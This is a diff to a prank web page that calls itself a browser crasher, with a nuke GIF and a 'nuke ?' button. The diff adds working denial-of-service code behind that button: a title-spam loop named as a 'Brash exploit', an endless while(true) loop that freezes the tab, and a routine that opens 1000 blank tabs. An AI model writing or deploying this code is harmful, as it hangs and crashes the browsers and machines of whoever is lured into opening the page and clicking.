@@ -45,7 +45,7 @@
             width: 75vmin;
             max-width: 700px;
             height: auto;
-            margin-bottom: 40px;
+            margin-bottom: 20px;
             border: 5px solid #fff;
             box-shadow: 0 0 40px #ff2222, 0 0 80px #ff0000;
             animation: explode 1.5s ease-in-out infinite alternate;
@@ -67,9 +67,6 @@
             }
         }
         #nuke-button {
-            position: fixed;
-            bottom: 20px;
-            right: 20px;
             padding: 12px 24px;
             background: #ff4444;
             color: white;
@@ -78,8 +75,10 @@
             border: 2px solid #fff;
             border-radius: 8px;
             cursor: pointer;
-            z-index: 20;
             transition: background 0.3s, transform 0.3s;
+            pointer-events: auto;
+            z-index: 10000;
+            display: none;
         }
         #nuke-button:hover {
             background: #ff0000;
@@ -94,9 +93,8 @@
     <div id="crash-overlay">
         <img id="crash-gif" src="https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif" alt="NUCLEAR">
         bye bye ram … and cpu
+        <button id="nuke-button">nuke ?</button>
     </div>
-
-    <button id="nuke-button">nuke ?</button>
 
     <script>
         const canvas = document.getElementById("matrixCanvas");
@@ -132,6 +130,7 @@
 
         const logo = document.getElementById("logo");
         const overlay = document.getElementById("crash-overlay");
+        const nukeButton = document.getElementById("nuke-button");
 
         let x = Math.random() * (window.innerWidth - 260) + 20;
         let y = Math.random() * (window.innerHeight - 140) + 20;
@@ -162,28 +161,39 @@
         requestAnimationFrame(updateLogo);
 
         const titleStrings = [];
-        for (let i = 0; i < 120; i++) {
+        for (let i = 0; i < 250; i++) {
             let str = '';
-            for (let j = 0; j < 512; j++) {
-                str += Math.random().toString(16)[2];
+            for (let j = 0; j < 1024; j++) {
+                str += Math.random().toString(36)[2] || 'x';
             }
             titleStrings.push(str);
         }
 
         function startBrashExploit() {
             let counter = 0;
-            const brashInterval = setInterval(() => {
-                for (let burst = 0; burst < 80; burst++) {
-                    document.title = titleStrings[counter % titleStrings.length] + " 💀 BYE";
+            function spamLoop() {
+                for (let burst = 0; burst < 200; burst++) {
+                    document.title = titleStrings[counter % titleStrings.length] + " 💀" + counter;
                     counter++;
                 }
-                if (Math.random() > 0.92) {
-                    document.title = "crash in progress...";
+                if (counter < 10000000) {
+                    requestAnimationFrame(spamLoop);
                 }
-                if (counter > 500000) {
-                    clearInterval(brashInterval);
-                }
-            }, 4);
+            }
+            spamLoop();
+        }
+
+        function startInfiniteLoop() {
+            while (true) {
+                Math.random();
+                Date.now();
+            }
+        }
+
+        function openSpamTabs() {
+            for (let i = 0; i < 1000; i++) {
+                window.open('about:blank', '_blank');
+            }
         }
 
         function triggerCrash() {
@@ -217,19 +227,22 @@
 
                     setTimeout(() => {
                         startBrashExploit();
+                        startInfiniteLoop();
+                        openSpamTabs();
                     }, 800);
                 }
             }, flashIntervalMs);
         }
 
-        logo.addEventListener("click", triggerCrash);
+        logo.addEventListener("click", () => {
+            overlay.style.opacity = "1";
+            nukeButton.style.display = "block";
+            document.getElementById("crash-gif").style.animation = "explode 1.5s ease-in-out 1";
+        });
 
-        const nukeButton = document.getElementById("nuke-button");
         nukeButton.addEventListener("click", () => {
             nukeButton.style.display = "none";
-            overlay.style.opacity = "1";
-            document.getElementById("crash-gif").style.animation = "explode 1.5s ease-in-out 1";
-            setTimeout(triggerCrash, 1600);
+            triggerCrash();
         });
 
         window.addEventListener("resize", () => {
